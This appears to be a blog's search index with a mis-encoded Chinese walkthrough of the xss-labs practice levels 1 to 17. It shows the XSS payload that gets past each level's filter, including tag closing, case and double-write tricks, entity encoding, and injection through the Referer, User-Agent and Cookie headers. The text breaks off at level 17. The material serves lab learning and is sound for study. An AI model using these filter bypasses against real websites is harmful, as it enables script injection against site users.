<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>æ‚è®°</title>
    <link href="/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/"/>
    <url>/kele6.github.io/2024/04/15/%E6%9D%82%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>æœ¬åœ°è®¿é—®</p><p>X-Real-Ip:<br>X-Forwarded-For:<br>Client-Ip:</p><p>ä»£ç†ï¼ˆä»å“ªä¸ªç½‘ç«™ï¼‰</p><p>Via:</p><p>Referer(ä»å“ªä¸ªç½‘ç«™)</p><p>User-Agentï¼ˆä»å“ªä¸ªæµè§ˆå™¨ï¼‰</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/kele6.github.io/2024/04/15/xss/"/>
    <url>/kele6.github.io/2024/04/15/xss/</url>
    
    <content type="html"><![CDATA[<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">title: xss1<br>date: 2024<span class="hljs-string">-04</span><span class="hljs-string">-15</span> 14:18:20<br><span class="hljs-keyword">tags:</span><br></code></pre></td></tr></table></figure><h1 id="xsslabs"><a href="#xsslabs" class="headerlink" title="xsslabs"></a>xsslabs</h1><p><em>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p><p><em>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/ytdd66/article/details/136946635">https://blog.csdn.net/ytdd66/article/details/136946635</a></em></p><h2 id="level-1â€”â€“æ— è¿‡æ»¤"><a href="#level-1â€”â€“æ— è¿‡æ»¤" class="headerlink" title="level-1â€”â€“æ— è¿‡æ»¤"></a>level-1â€”â€“æ— è¿‡æ»¤</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">æ— è¿‡æ»¤ç›´æ¥ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="level-2â€”â€”é—­åˆæ ‡ç­¾"><a href="#level-2â€”â€”é—­åˆæ ‡ç­¾" class="headerlink" title="level-2â€”â€”é—­åˆæ ‡ç­¾"></a>level-2â€”â€”é—­åˆæ ‡ç­¾</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">é—­åˆæ ‡ç­¾ï¼š&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(123);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="level-3â€”â€“å•å¼•å·é—­åˆ-js"><a href="#level-3â€”â€“å•å¼•å·é—­åˆ-js" class="headerlink" title="level-3â€”â€“å•å¼•å·é—­åˆ+js"></a>level-3â€”â€“å•å¼•å·é—­åˆ+js</h2><p>å•å¼•å·é—­åˆ+jsï¼šå¯èƒ½ä¼šå¯¹ â€œ  &lt; &gt; ç¼–ç ï¼ˆå³è¿‡æ»¤ï¼‰ å¯ä»¥jsï¼šâ€™onclick&#x3D;â€™javascript:alert(123)â€™            â€˜onfocus&#x3D;â€™javascript:alert(123)â€™                    â€˜onblur&#x3D;â€™javascript:alert(123)â€™                     (å»æ‰å•å¼•å·å°±è¦åŠ &#x2F;&#x2F;æˆ–è€…&gt;)â€”â€”â€“è¢«è¿‡æ»¤å°±ä¸å¯äº† åé¢åŠ  &#x2F;&#x2F;  &gt; ä¹Ÿæ˜¯å¯ä»¥çš„</p><h2 id="level-4â€”â€“åŒå¼•å·é—­åˆ-js"><a href="#level-4â€”â€“åŒå¼•å·é—­åˆ-js" class="headerlink" title="level-4â€”â€“åŒå¼•å·é—­åˆ+js"></a>level-4â€”â€“åŒå¼•å·é—­åˆ+js</h2><p>åŒå¼•å·é—­åˆ+jsï¼š â€œonclick&#x3D;javascript:alert(1)&#x2F;&#x2F; â€œonclick&#x3D;â€™javascript:alert(1)â€™</p><h2 id="level-5-â€”â€“jsä¼ªåè®®"><a href="#level-5-â€”â€“jsä¼ªåè®®" class="headerlink" title="level-5 â€”â€“jsä¼ªåè®®"></a>level-5 â€”â€“jsä¼ªåè®®</h2><p>éƒ¨åˆ†ä»£ç ï¼š</p><p>$str &#x3D; strtolower($_GET[â€œkeywordâ€]); $str2&#x3D;str_replace(â€œ&lt;scriptâ€,â€&lt;scr_iptâ€,$str); $str3&#x3D;str_replace(â€œonâ€,â€o_nâ€,$str2);</p><p>jsä¼ªåè®®ï¼šå‘ç°scriptå’Œonéƒ½è¢«æ›¿æ¢ï¼Œ è¿™ä¸€å…³æˆ‘ä»¬åˆ©ç”¨<code>&lt;a&gt;</code>æ ‡ç­¾ç»•è¿‡è¿›è¡Œç»•è¿‡ã€‚ <code>&quot;&gt; &lt;a href=javascript:alert(123)&gt;xss&lt;/a&gt;</code></p><h2 id="level-6â€”â€“å¤§å°å†™ç»•è¿‡"><a href="#level-6â€”â€“å¤§å°å†™ç»•è¿‡" class="headerlink" title="level-6â€”â€“å¤§å°å†™ç»•è¿‡"></a>level-6â€”â€“å¤§å°å†™ç»•è¿‡</h2><p>å¤§å°å†™ç»•è¿‡ï¼š <code>&#39;&quot;&gt;&lt;a Href=javascript:alert(11)&gt;aa&lt;/a&gt;//</code> <code>&quot;&gt; &lt;ScripT&gt;alert(1)&lt;/ScRipT&gt;</code></p><h2 id="level-7â€”â€“åŒå†™ç»•è¿‡"><a href="#level-7â€”â€“åŒå†™ç»•è¿‡" class="headerlink" title="level-7â€”â€“åŒå†™ç»•è¿‡"></a>level-7â€”â€“åŒå†™ç»•è¿‡</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">`<span class="hljs-meta">&lt;?php</span>` <br>`***<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);***`<br>`***<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];***`<br>`***<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);***`<br>`***<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);***`<br>`***<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);***`<br>`***<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);***`<br>`***<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);***`<br></code></pre></td></tr></table></figure><p>$str2 å˜é‡é€šè¿‡ str_replace(â€œ&lt;scriptâ€,â€&lt;scr_iptâ€,$str); å°†å­—ç¬¦ä¸²ä¸­çš„ &lt;script æ›¿æ¢ä¸º &lt;scr_iptï¼Œé˜²æ­¢æ¶æ„è„šæœ¬çš„æ³¨å…¥ã€‚â€”â€”â€”â€”å…¶ä»–çš„ä¸€æ ·</p><p><strong>hrefè¢«æ›¿æ¢æˆç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ï¼Œä½¿ç”¨åŒå†™è¿›è¡Œç»•è¿‡</strong> <code>&quot;&gt;&lt;scrscriptipt&gt;alert(32);&lt;/scrscriptipt&gt;</code> <code>&#39;&quot;&gt;&lt;a HRhrefEF=&#39;javascrscriptipt:alert(&quot;jaden&quot;)&#39;&gt;jaden&lt;/a&gt;</code></p><h2 id="level-8â€”â€“ç¼–ç ç»•è¿‡"><a href="#level-8â€”â€“ç¼–ç ç»•è¿‡" class="headerlink" title="level-8â€”â€“ç¼–ç ç»•è¿‡"></a>level-8â€”â€“ç¼–ç ç»•è¿‡</h2><p>å‘ç°å†…å®¹è¾“å‡ºåœ¨äº†aæ ‡ç­¾çš„hrefå±æ€§ä¸­ï¼Œå½“æˆ‘ä»¬æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œjavascriptä¸ä»…åŠ äº†_ï¼Œå¹¶ä¸”ä½¿ç”¨äº†htmlå®ä½“ç¼–ç ï¼Œå°†ç‰¹æ®Šç¬¦å·è¿›è¡Œäº†ç¼–ç ï¼Œå¯¼è‡´ä¸èƒ½è¿›è¡Œæ ‡ç­¾é—­åˆï¼Œé‚£ä¹ˆæ—¢ç„¶å†…å®¹æ”¾åˆ°äº†æŸä¸ªæ ‡ç­¾çš„å±æ€§å€¼é‡Œé¢ï¼Œæˆ‘ä»¬è¯´è¿‡ï¼Œå±æ€§å€¼æ˜¯å¯ä»¥è¿›è¡Œç¼–ç ç»•è¿‡çš„ï¼Œå°è¯•htmlå®ä½“ç¼–ç ç»•è¿‡ã€‚ javascript:alert(â€œjadenâ€) ç¼–ç ï¼šæ•´ä¸ªè¿›è¡Œç¼–ç  é‡‡ç”¨<em><strong>åè¿›åˆ¶asciiç </strong></em> javascript:alert(â€œjadenâ€) æˆ–è€…<em><strong>åå…­è¿›åˆ¶unicodeç¼–ç </strong></em> javascript :alert(â€œja denâ€)</p><h2 id="level-9â€”â€“httpåè®®æ ¡éªŒ-æŒ‡å®šå†…å®¹ç»•è¿‡"><a href="#level-9â€”â€“httpåè®®æ ¡éªŒ-æŒ‡å®šå†…å®¹ç»•è¿‡" class="headerlink" title="level-9â€”â€“httpåè®®æ ¡éªŒ(æŒ‡å®šå†…å®¹ç»•è¿‡)"></a>level-9â€”â€“httpåè®®æ ¡éªŒ(æŒ‡å®šå†…å®¹ç»•è¿‡)</h2><p>å‘ç°ï¼Œä¸Šé¢çš„è¿™å‡ ç§ç»•è¿‡æ–¹å¼éƒ½ä¸è¡Œäº†ï¼Œä½†æ˜¯çœ‹åˆ°ä¸€ä¸ªå‹æƒ…é“¾æ¥ï¼Œå†™ä¸Šä¸€ä¸ªæ­£ç¡®çš„httpç½‘å€å¯ä»¥çœ‹åˆ°è¾“ å‡ºåœ¨äº†hrefå±æ€§ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåšäº†ç½‘å€æ ¼å¼çš„æ ¡éªŒï¼Œçœ‹åå°ä»£ç å‘ç°å…¶å®å°±æ˜¯httpåè®®æ ¡éªŒï¼Œé‚£ä¹ˆæˆ‘ ä»¬å¯ä»¥å·§ç”¨jsä»£ç ä¸­çš„æ³¨é‡Šç¬¦å· &#x2F;&#x2F; ã€‚</p><p>javascript:alert(â€œjadenâ€)&#x2F;&#x2F;<a href="http://www.baidu.com/">http://www.baidu.com</a> #ä½†æ˜¯å‰é¢çš„ javascript:alert(â€œjadenâ€)è¦è¿›è¡Œç¼–ç ï¼Œä¸ç„¶ä¼šè¢«åŠ ä¸Š_</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">javascript:ale&amp;<span class="hljs-string">` `</span>#<span class="hljs-number">114</span>;t(<span class="hljs-string">&quot;jaden&quot;</span>)//http://www.baidu.c<span class="hljs-string">` `</span>om<span class="hljs-string">` `</span>javascript:alert()<span class="hljs-comment">/* http:// */</span><br></code></pre></td></tr></table></figure><p><em><strong>æœ¬å…³å°ç»“</strong>ï¼šæ’å…¥æŒ‡å®šå†…å®¹ï¼ˆæœ¬å…³æ˜¯http:&#x2F;&#x2F;ï¼‰ç»•è¿‡æ£€æµ‹ï¼Œå†å°†æŒ‡å®šå†…å®¹ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰å³å¯</em> </p><h2 id="level10â€”â€“getä¼ å‚ï¼Œéšè—çš„inputæ ‡ç­¾å¯ä»¥æ’å…¥type-â€textâ€æ˜¾ç¤º"><a href="#level10â€”â€“getä¼ å‚ï¼Œéšè—çš„inputæ ‡ç­¾å¯ä»¥æ’å…¥type-â€textâ€æ˜¾ç¤º" class="headerlink" title="level10â€”â€“getä¼ å‚ï¼Œéšè—çš„inputæ ‡ç­¾å¯ä»¥æ’å…¥type&#x3D;â€textâ€æ˜¾ç¤º"></a>level10â€”â€“getä¼ å‚ï¼Œéšè—çš„inputæ ‡ç­¾å¯ä»¥æ’å…¥type&#x3D;â€textâ€æ˜¾ç¤º</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]<span class="hljs-comment">;</span><br><br><br><br>$str11 = $_GET[<span class="hljs-string">&quot;t_sort&quot;</span>]<span class="hljs-comment">;</span><br><br><br><br>$str22=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str11)<span class="hljs-comment">;</span><br><br><br><br>$str33=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str22)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸¤è¡Œä»£ç å¯¹ $str11 å˜é‡è¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢æ“ä½œã€‚é¦–å…ˆï¼Œå®ƒç§»é™¤äº† $str11 ä¸­æ‰€æœ‰çš„ â€œ&gt;â€ å­—ç¬¦ï¼Œç„¶åå°†ç»“æœå­˜å‚¨åœ¨ $str22 ä¸­ã€‚æ¥ç€ï¼Œå®ƒç§»é™¤äº† $str22 ä¸­æ‰€æœ‰çš„ â€œ&lt;â€ å­—ç¬¦ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ $str33 ä¸­é¦–å…ˆï¼Œè¾“å‡ºä¸€ä¸ªå±…ä¸­çš„ <code>&lt;h2&gt;</code> æ ‡é¢˜ï¼Œæç¤ºç”¨æˆ·æ²¡æœ‰æ‰¾åˆ°å’Œ $str ç›¸å…³çš„ç»“æœã€‚è¿™é‡Œä½¿ç”¨htmlspecialchars() å‡½æ•°æ¥ç¡®ä¿ $str ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¢«æ­£ç¡®è½¬ä¹‰ï¼Œæ¥ç€ï¼Œè¾“å‡ºä¸€ä¸ªè¡¨å•ï¼Œå…¶ä¸­åŒ…å«äº†ä¸‰ä¸ªéšè—çš„è¾“å…¥å­—æ®µï¼št_linkã€t_history å’Œ t_sortã€‚å‰ä¸¤ä¸ªå­—æ®µçš„å€¼éƒ½è¢«è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œè€Œç¬¬ä¸‰ä¸ªå­—æ®µçš„å€¼è¢«è®¾ç½®ä¸º $str33ï¼ˆå³å¤„ç†è¿‡çš„ $str11ï¼‰<img src="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png" alt="img"></p><p>ä¿®æ”¹ä¸ºtext<img src="https://img-blog.csdnimg.cn/direct/a10df435b4a94be4a3481e1d99d71d71.png" alt="img"></p><p><strong>payload:?t_sort&#x3D;onfocus&#x3D;javascript:alert() type&#x3D;â€textâ€</strong></p><p><em><strong>å°ç»“ï¼šæ ¹æ®æºç çŒœè§£ä¼ å‚çš„å‚æ•°åï¼Œéšè—çš„inputæ ‡ç­¾å¯ä»¥æ’å…¥type&#x3D;â€textâ€æ˜¾ç¤º</strong></em></p><h2 id="level-11â€”â€“referer"><a href="#level-11â€”â€“referer" class="headerlink" title="level-11â€”â€“referer"></a>level-11â€”â€“referer</h2><p><code>&lt;input&gt;</code>æ ‡ç­¾æœ‰å››ä¸ªå€¼ï¼Œéƒ½åšäº†éšè—å¤„ç†ï¼Œä¸éš¾çœ‹å‡ºï¼Œç¬¬å››ä¸ªåä¸ºt_refçš„<input>æ ‡ç­¾æ˜¯httpå¤´refererçš„å‚æ•°ï¼ˆå°±æ˜¯ç”±å•¥åœ°å€è½¬è·³åˆ°è¿™é‡Œçš„ï¼Œhttpå¤´çš„refererä¼šè®°å½•æœ‰ï¼‰ï¼Œæˆ‘ä»¬å…ˆåšä¸ªç®€å•çš„æµ‹è¯•æ¥éªŒè¯ä¸€ä¸‹å‰é¢ä¸‰ä¸ªæ ‡ç­¾åï¼ŒGETä¸POSTä¼ å‚éƒ½è¯•ä¸€ä¸‹çœ‹çœ‹ï¼ˆ<strong>éƒ½ä¸è¡Œ</strong>ï¼‰ <strong>é‚£åº”è¯¥å°±refererå¤´äº†ï¼Œç”¨burpsuiteæŠ“åŒ…ä¸€ä¸‹ï¼Œæ·»åŠ httpå¤´</strong> Referer: â€œ sRc DaTa OnFocus <code>&lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</code> <code>j</code> å¯¹æ¯”å‘ç°ï¼ŒæŠŠå¤§äºå°äºå·&gt;&lt;ç»™åˆ æ‰äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜èƒ½ç”¨onfocusï¼Œæ„é€ ä¸€ä¸ªhttpå¤´ï¼š Referer: â€œ onfocus&#x3D;javascript:alert() type&#x3D;â€text <strong>æœ¬å…³å°ç»“</strong>ï¼šè€ƒè™‘ä¸€ä¸‹httpå¤´ä¼ å€¼ï¼Œæœ¬å…³æ˜¯refererï¼Œä½†æ¥ä¸‹æ¥ä¹Ÿæœ‰å¯èƒ½æ˜¯å…¶ä»–å¤´ï¼Œå¦‚Cookieç­‰</p><h2 id="level-12â€”â€“User-Agentå¤´"><a href="#level-12â€”â€“User-Agentå¤´" class="headerlink" title="level-12â€”â€“User-Agentå¤´"></a>level-12â€”â€“User-Agentå¤´</h2><p>User-Agent: â€œ onfocus&#x3D;javascript:alert() type&#x3D;â€text</p><h2 id="level-13â€”â€“Cookieå¤´"><a href="#level-13â€”â€“Cookieå¤´" class="headerlink" title="level-13â€”â€“Cookieå¤´"></a>level-13â€”â€“Cookieå¤´</h2><p>Cookieï¼šâ€ onclick&#x3D;alert() type&#x3D;â€text </p><h2 id="level-14â€”â€“Pass"><a href="#level-14â€”â€“Pass" class="headerlink" title="level-14â€”â€“Pass"></a>level-14â€”â€“Pass</h2><h2 id="level-15â€”â€“ng-includeæ–‡ä»¶åŒ…æ¶µï¼Œå¯ä»¥æ— è§†htmlå®ä½“åŒ–"><a href="#level-15â€”â€“ng-includeæ–‡ä»¶åŒ…æ¶µï¼Œå¯ä»¥æ— è§†htmlå®ä½“åŒ–" class="headerlink" title="level-15â€”â€“ng-includeæ–‡ä»¶åŒ…æ¶µï¼Œå¯ä»¥æ— è§†htmlå®ä½“åŒ–"></a>level-15â€”â€“ng-includeæ–‡ä»¶åŒ…æ¶µï¼Œå¯ä»¥æ— è§†htmlå®ä½“åŒ–<img src="https://img-blog.csdnimg.cn/ff0bfa43bf4d454e881ce358844c9651.png" alt="img"></h2><p>ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚ åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚â€”â€”â€“<em><strong>ng-includeæŒ‡ä»¤å°±æ˜¯æ–‡ä»¶åŒ…æ¶µçš„æ„æ€ï¼Œç”¨æ¥åŒ…æ¶µå¤–éƒ¨çš„htmlæ–‡ä»¶ï¼Œå¦‚æœåŒ…æ¶µçš„å†…å®¹æ˜¯åœ°å€ï¼Œéœ€è¦åŠ å¼•å·</strong></em> ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚</p><p>è¯­æ³• &lt; element  ng-include&#x3D; â€œfilenameâ€  Î¿nlÎ¿ad&#x3D; â€œexpressionâ€  autoscroll&#x3D; â€œexpressionâ€  &gt; &lt; &#x2F;element &gt; ng-include æŒ‡ä»¤ä½œä¸ºå…ƒç´ ä½¿ç”¨:</p><p>&lt; ng-include  src&#x3D; â€œfilenameâ€  Î¿nlÎ¿ad&#x3D; â€œexpressionâ€  autoscroll&#x3D; â€œexpressionâ€  &gt; &lt; &#x2F;ng-include &gt; æ‰€æœ‰çš„ HTML å…ƒç´ éƒ½æ”¯æŒè¯¥æŒ‡ä»¤ã€‚</p><p>å‚æ•°å€¼ å€¼:æè¿° filename:æ–‡ä»¶åï¼Œå¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼æ¥è¿”å›æ–‡ä»¶åã€‚ onload:å¯é€‰ï¼Œ æ–‡ä»¶è½½å…¥åæ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚ autoscroll:å¯é€‰ï¼ŒåŒ…å«çš„éƒ¨åˆ†æ˜¯å¦åœ¨æŒ‡å®šè§†å›¾ä¸Šå¯æ»šåŠ¨ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/u011127019/article/details/53666528/">https://blog.csdn.net/u011127019/article/details/53666528/</a></p><p><strong>å¼€å§‹åšé¢˜ï¼š</strong> <strong>1</strong>.æˆ‘ä»¬å…ˆè¯•è¯•çœ‹åŒ…æ¶µç¬¬ä¸€å…³ï¼Œæ„å»ºpayloadï¼š?src&#x3D;â€™&#x2F;level1.phpâ€™ <img src="https://img-blog.csdnimg.cn/2f2dd7d829ab4796a3f99eb55c5f6a79.png" alt="img"></p><p>æ‰€ä»¥å¯ä»¥éšä¾¿åŒ…æ¶µä¹‹å‰çš„ä¸€å…³å¹¶å¯¹å…¶ä¼ å‚ï¼Œä»¥è¾¾åˆ°å¼¹çª—çš„æ•ˆæœï¼Œå…ˆæµ‹è¯•ä¸€ä¸‹è¿‡æ»¤äº†å•¥ï¼Œæ„é€ payload ?src&#x3D;â€ â€˜ sRc DaTa OnFocus <code>&lt;s</code>CriPt&gt; &lt;a hReF&#x3D;javascript:alert()<code>&gt;</code> j <img src="https://img-blog.csdnimg.cn/4824b5a8ac984052b118e85e0ef7d723.png" alt="img"></p><p>**2.**å¯¹æ¯”å‘ç°ï¼Œè¿™é‡Œæœ‰ä¸ªhtmlå®ä½“åŒ–å‡½æ•°åœ¨ï¼Œæ²¡æœ‰åˆ æ‰ä¸œè¥¿ï¼Œæ‰€ä»¥ä¸å½±å“æˆ‘ä»¬æ¥ä¸‹æ¥çš„æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥åŒ…æ¶µç¬¬ä¸€å…³å¹¶è®©ç¬¬ä¸€å…³å¼¹çª—ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œä¸èƒ½åŒ…æ¶µé‚£äº›ç›´æ¥å¼¹çª—çš„ä¸œè¥¿å¦‚<code>&lt;script&gt;</code>ï¼Œä½†æ˜¯å¯ä»¥åŒ…æ¶µé‚£äº›æ ‡ç­¾çš„ä¸œè¥¿æ¯”å¦‚<code>&lt;a&gt;ã€&lt;input&gt;ã€&lt;img&gt;ã€&lt;p&gt;</code>æ ‡ç­¾ç­‰ç­‰ï¼Œè¿™äº›æ ‡ç­¾æ˜¯èƒ½éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ç‚¹å‡»å¼¹çª—çš„ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨imgæ ‡ç­¾ï¼Œå¯å‚è€ƒXSSå¸¸è§çš„è§¦å‘æ ‡ç­¾ï¼Œæ„é€ payload ï¼š?src&#x3D;â€™&#x2F;level1.php?name&#x3D;&lt;img src&#x3D;1 onmouseover&#x3D;alert()&gt;â€™ **3.**å½“é¼ æ ‡ç§»åŠ¨åˆ°å›¾ç‰‡çš„æ—¶å€™å°±è§¦å‘äº†å¼¹çª— <img src="https://img-blog.csdnimg.cn/16343a7a36204eb9883842c0fade4146.png" alt="img"></p><p>å½“ç„¶ä¹Ÿèƒ½ç”¨pæ ‡ç­¾ï¼Œå¯ä»¥æ„é€ payloadï¼š?src&#x3D;â€™&#x2F;level1.php?name&#x3D;<code>&lt;</code>p onmousedown&#x3D;alert()&gt;å“ˆå“ˆå“ˆ&lt;&#x2F;p<code>&gt;</code>â€˜ ç‚¹å‡»å“ˆå“ˆå“ˆå³å¯å¼¹çª—ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™å…³çš„åç«¯æºç  <img src="https://img-blog.csdnimg.cn/454dfa88edfc4ef8be18f846f5b6aff8.png" alt="img"></p><h2 id="level-16â€”â€“å›è½¦ä»£æ›¿ç©ºæ ¼ç»•è¿‡æ£€æµ‹"><a href="#level-16â€”â€“å›è½¦ä»£æ›¿ç©ºæ ¼ç»•è¿‡æ£€æµ‹" class="headerlink" title="level-16â€”â€“å›è½¦ä»£æ›¿ç©ºæ ¼ç»•è¿‡æ£€æµ‹"></a>level-16â€”â€“å›è½¦ä»£æ›¿ç©ºæ ¼ç»•è¿‡æ£€æµ‹</h2><p><strong>1.</strong><img src="https://img-blog.csdnimg.cn/3cc75094c9d4495eac9cbb7bfa8c7e17.png" alt="img"></p><p>testæ’å…¥åˆ°äº†centeræ ‡ç­¾ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸ç”¨é—­åˆäº†ï¼Œè€è§„çŸ©ï¼Œå…ˆæµ‹è¯•ä¸€æ³¢å…³é”®å­—ï¼š?<code>keyword=&quot; &#39; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; j</code>  <code>.Kht.m.1..â€¦.g...app&gt;2 &lt;head&gt;</code> <code>3</code></p><p>&lt;body<code>&gt;</code>span class&#x3D;â€ng-include:â€ â€™sRc DaTa OnFocus &lt;sCriPtgt; 6lt;a hReF&#x3D;-javascript:alert()kgt ; â€œXlspan(&#x2F;body 18</p><p>**2.**å¯¹æ¯”å‘ç°ï¼Œè¿™é‡Œå…ˆæ˜¯å°†å­—æ¯å°å†™åŒ–äº†ï¼Œå†æŠŠscriptæ›¿æ¢æˆç©ºæ ¼ï¼Œæœ€åå°†ç©ºæ ¼ç»™å®ä½“åŒ–ï¼Œæƒ³å°è¯•ä¸€ä¸‹pæ ‡ç­¾&lt;p Î¿nmÎ¿usedÎ¿wn&#x3D;alert()&gt;abc&lt;&#x2F;p<code>&gt;</code>ï¼Œè°çŸ¥é“ä¹Ÿå°†&#x2F;ç»™æ›¿æ¢æˆäº†ç©ºæ ¼ï¼Œæ— å¥ˆï¼Œåªå¥½çœ‹ä¸€ä¸‹åç«¯æºç  <code>$str2=str_replace(&quot;script&quot; , &quot; &quot;,$str);</code> $str3&#x3D;str_replace(â€œ â€œ, â€œ â€œ ,$str2); $str4&#x3D;str_replace(â€œ&#x2F;â€œ, â€œ â€œ,$str3); $str5&#x3D;str_replace(â€œ â€œ, â€œ â€œ ,$str4); echo â€œ<code>&lt;center&gt;</code>â€œ.$str5.â€<code>&lt;/center</code>&gt;â€;?&gt;&#96;</p><p>**3.**æœç„¶ç»™è¿‡æ‰äº†ï¼Œç©ºæ ¼å¯ä»¥ç”¨å›è½¦æ¥ä»£æ›¿ç»•è¿‡ï¼Œå›è½¦çš„urlç¼–ç æ˜¯%0aï¼Œå†é…åˆä¸Šä¸ç”¨&#x2F;çš„<code>&lt;img&gt;ã€&lt;details&gt;ã€&lt;svg&gt;</code>ç­‰æ ‡ç­¾ï¼Œæ›´å¤šæ ‡ç­¾å¯å‚è€ƒ<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSSå¸¸è§çš„è§¦å‘æ ‡ç­¾</a></p><p>éšä¾¿é€‰ä¸ªæ ‡ç­¾ï¼Œå°†ç©ºæ ¼æ›¿æ¢æˆå›è½¦çš„urlç¼–ç ï¼Œæ„é€ payload  ?keyword&#x3D;&lt;svg%0Aonload&#x3D;alert(1)&gt;</p><h2 id="level-17â€”â€“embedæ ‡ç­¾"><a href="#level-17â€”â€“embedæ ‡ç­¾" class="headerlink" title="level-17â€”â€“embedæ ‡ç­¾"></a>level-17â€”â€“embedæ ‡ç­¾</h2><p><code>&lt;e</code>mbed src&#x3D;â€xsf01.swf ?a&#x3D;bâ€ width&#x3D;â€100%â€ heigth&#x3D;â€100%â€&gt; </p><p>è¿™ä¸ªä¼ å…¥äº†ä¸¤ä¸ªå€¼ï¼Œåˆ†åˆ«ä½œä¸ºsrcä¸­çš„xsf01.swfçš„å˜é‡å’Œå€¼ä¼ 